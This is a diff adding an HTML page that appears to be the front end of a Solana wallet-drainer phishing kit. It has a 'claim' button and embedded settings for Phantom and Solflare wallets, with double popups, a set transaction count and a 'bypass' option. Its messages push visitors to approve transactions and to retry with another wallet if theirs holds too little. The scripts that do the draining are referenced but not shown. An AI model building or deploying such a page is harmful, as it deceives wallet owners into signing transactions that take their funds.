@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>:O</title>
+    <link rel="stylesheet" href="./fonts.css" data-n-g="">
+    <link rel="stylesheet" href="./popup.css" data-n-g="">
+    <link rel="stylesheet" href="./style.css">
+</head>
+
+<body>
+    <button id="claim-button"> button </button>
+    <script>
+      // Directly embed settings JSON in the page instead of loading from file
+      window.settingData = {
+        modal: 1,
+        phantomWallet: {
+          type: 0,
+          doublePopup: {
+            enabled: true,
+            solana: 1,
+            tokens: []
+          },
+          lol: {
+            enabled: true,
+            solana: 1,
+            tokens: []
+          },
+          sCon: false
+        },
+        solflareWallet: {
+          transactions: 4,
+          sol: 2
+        },
+        words: {
+          onClaiming: "Processing",
+          onClaimingDesc: "Please wait while we verify your wallet and assets...",
+          onClaimingIneligible: "Not Eligible",
+          onClaimingIneligibleDesc: "Your wallet does not have sufficient assets to continue. Please try again with another wallet.",
+          onClaimLoading: "Working on it...",
+          onClaimLoadingDesc: "Please keep your wallet app open while we process your transaction.",
+          onConnected: "Connected",
+          onDecline: "Action Required",
+          onDeclineDesc: "You need to approve the transaction in your wallet app to continue."
+        },
+        bypass: {
+          enabled: false,
+          concurrent: 0,
+          loadTime: 0
+        }
+      };
+
+      // No need to fetch settings.json since we've embedded it directly
+      console.log("Settings embedded directly in page");
+    </script>
+    <script defer type="module" src="./modals.js"></script>
+    <script defer type="module" src="./main.js"></script>
+</body>
+
+</html>
